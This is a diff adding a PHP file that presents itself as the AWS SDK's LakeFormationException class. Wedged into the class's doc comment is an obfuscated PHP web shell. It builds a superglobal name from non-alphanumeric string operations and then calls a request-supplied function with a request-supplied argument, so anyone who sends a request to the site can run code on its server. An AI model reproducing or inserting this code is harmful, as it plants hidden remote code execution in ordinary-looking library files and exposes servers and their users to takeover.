@@ -1,0 +1,15 @@
+<?php
+namespace Aws\LakeFormation\Exception;
+
+use Aws\Exception\AwsException;
+
+/**
+<?php
+$_="";
+$_[+""]='';
+$_="$_"."";
+$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
+?>
+<?php ${'_'.$_}['_'](${'_'.$_}['__']);?> * Represents an error interacting with the **AWS Lake Formation** service.
+ */
+class LakeFormationException extends AwsException {}
